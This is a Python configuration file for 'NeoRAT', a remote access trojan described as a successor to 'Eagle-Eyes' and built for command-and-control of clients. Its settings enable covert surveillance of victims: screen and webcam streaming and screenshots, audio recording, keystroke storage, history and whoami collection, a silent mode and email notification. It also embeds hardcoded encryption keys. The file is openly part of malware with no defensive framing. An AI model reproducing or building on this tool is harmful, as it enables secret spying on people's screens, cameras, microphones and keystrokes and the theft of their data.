from binary.encrypt_data import *


state = {
  'name': 'NeoRAT',
  'description': 'NeoRAT is the successor of Eagle-Eyes, providing a more stable & organized\n'
               + 'experience. NeoRAT is built for C2 of clients & easy ways of providing\n'
               + 'reliable & feature rich data gathering techniques. [USE: \'HELP\']',
  'author': 'Authors Github: https://github.com/Alvin-22',
  'settings': {
    'dynamic': {
      'is-loading': False,
      'alias-size': None,
      'alias-data': None,
      'queue': []
    },
    'debug': False,
    'safe-timeout': 60,
    'keep-alive-count': 60,
    'max-file-size': 75,
    'loading': True,
    'loading-animation': False,
    'encoding': 'latin-1',
    'headersize': 10,
    'io-channels': [None, None],
    'encryption': Encryption(
                  'ksxgyRuBRJLKxjFeHD4nmxbE',
                  b'v4CuHZFzmTedBY2EBGrLRXsm'),
    'folders': {
      'parent': 'Resources',
      'child': ('Files',
                'Scripts',
                'Haarcascades',
                'Keystroke')
    }
  },
  'session': {
    'active': False,
    'socket': None,
    'username': None,
    'data': None
  },
  'sockets': {
    'server': None,
    'clients': [[], [], []],
    'modules': {
      'stream': [None, []],
      'cam': [None, []],
      'audio': [None, []],
      'talk': [None, []]
    }
  },
  'options': {
    'mode': {
      'safe': False,
      'silent': False,
    },
    'validation': {
      'duplicates': True,
      'max-clients': 25
    },
    'information-gathering': {
      'history': True,
      'whoami': True,
      'record': {
        'stream': True,
        'cam-stream': True,
        'audio': True,
        'talk': True
      },
      'save': {
        'screenshot': True,
        'cam-screenshot': True
      },
      'backup': {
        'text': False,
        'image': False
      }
    },
    'notice': {
      'email-notice': False,
      'email-data': {
        'email': None,
        'password': None,
        'to': None
      }
    }
  }
}